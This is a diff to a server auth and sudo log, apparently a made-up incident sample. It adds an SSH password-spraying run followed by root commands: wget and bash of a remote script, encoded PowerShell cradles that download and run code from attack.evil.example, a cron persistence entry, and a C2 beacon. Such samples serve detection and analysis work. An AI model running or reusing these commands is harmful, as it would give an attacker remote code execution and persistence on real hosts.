@@ -1,7 +1,16 @@
-Aug 25 10:30:01 server sshd: Failed password for admin from 185.23.45.67
-Aug 25 10:30:05 server sshd: Failed password for admin from 185.23.45.67
-Aug 25 10:30:09 server sshd: Failed password for admin from 185.23.45.67
-Aug 25 10:30:14 server sshd: Accepted password for admin from 185.23.45.67
+Aug 25 10:30:01 server sshd: Failed password for invalid user admin from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:03 server sshd: Failed password for admin from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:05 server sshd: Failed password for root from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:07 server sshd: Failed password for admin from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:09 server sshd: Failed password for svc_backup from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:11 server sshd: Failed password for admin from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:13 server sshd: Failed password for oracle from 185.23.45.67 port 22 ssh2
+Aug 25 10:30:16 server sshd: Accepted password for admin from 185.23.45.67 port 22 ssh2
 Aug 25 10:30:20 server sshd[4123]: Accepted publickey for admin from 185.23.45.67 port 22 ssh2
 Aug 25 10:31:02 server sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://185.23.45.67/x.sh -O /tmp/x.sh
-Aug 25 10:31:40 server sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
+Aug 25 10:31:15 server sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
+Aug 25 10:31:40 server sudo:   admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/pwsh -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQApADsALQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBpAG4AaQB0AC4AcABzADEAJwApAA==
+Aug 25 10:31:52 server sudo:   admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://attack.evil.example/drop.ps1 -O /tmp/x2.ps1
+Aug 25 10:32:10 server sudo:   admin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "* * * * * root /tmp/x.sh" > /etc/cron.d/system-check'
+Aug 25 10:33:05 server curl: GET http://attack.evil.example/c2/beacon?id=corp-server01 -> 200
+Aug 25 10:33:20 server sudo:   admin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/pwsh -enc ICAgIGllAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHQAcgBhAG4AcwBmAGUAcgAuAHAAcwAxACcAKQAKAA==
